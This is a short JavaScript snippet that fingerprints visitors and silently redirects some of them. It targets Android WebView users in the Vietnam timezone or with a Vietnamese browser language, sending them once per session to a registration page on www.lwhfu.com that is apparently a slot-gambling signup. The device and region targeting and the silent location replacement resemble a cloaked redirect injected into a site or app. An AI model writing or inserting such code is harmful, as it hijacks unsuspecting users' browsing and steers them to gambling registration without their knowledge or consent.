(function () {
  const ua = navigator.userAgent || "";
  const isAndroid = /Android/i.test(ua);
  const isWebView = /\bwv\b|Android.*Version\/[\d.]+.*Chrome\/[\d.]+/i.test(ua);
  const isMobile = /Android|iPhone|iPad|iPod/i.test(ua);

  if (!isAndroid || !isWebView || !isMobile) return;

  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const language = navigator.language || "";

  const isVietnam =
    timeZone === "Asia/Ho_Chi_Minh" ||
    language.toLowerCase().startsWith("vi");

  if (isVietnam && !sessionStorage.getItem("vn_redirected")) {
    sessionStorage.setItem("vn_redirected", "1");
    window.location.replace("https://www.lwhfu.com/vn/register/?utm_source=Android&utm_medium=download&utm_campaign=slot&utm_id=397364");
  }
})();
